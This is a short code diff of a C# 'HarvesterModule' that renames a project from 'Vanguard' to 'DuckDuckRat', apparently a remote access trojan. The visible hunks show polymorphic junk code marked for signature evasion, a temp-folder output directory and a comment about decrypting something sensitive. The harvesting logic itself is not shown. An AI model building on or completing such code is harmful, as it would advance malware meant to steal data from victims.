@@ -1,14 +1,14 @@
 using System;
 using System.IO;
 using System.Collections.Generic;
-using VanguardCore; // Built-in reference to our SafetyManager
+using DuckDuckRat; // Built-in reference to our SafetyManager
 
-namespace VanguardNative
+namespace DuckDuckRatNative
 {
     public class HarvesterModule
     {
         // [POLY_JUNK]
-        private static void _vanguard_ba27b116() {
+        private static void _DuckDuckRat_ba27b116() {
             int val = 45236;
             if (val > 50000) Console.WriteLine("Hash:" + 45236);
         }
@@ -18,7 +18,7 @@ namespace VanguardNative
             try
             {
                 // Native Harvester Logic
-                string outputDir = args.Length > 0 ? args[0] : Path.Combine(Path.GetTempPath(), "VanguardOutput");
+                string outputDir = args.Length > 0 ? args[0] : Path.Combine(Path.GetTempPath(), "DUCK DUCK RAT v1Output");
                 Directory.CreateDirectory(outputDir);
                 
                 // 1. Decrypt something sensitive as proof of concept
@@ -42,3 +42,5 @@ namespace VanguardNative
         }
     }
 }
+
+
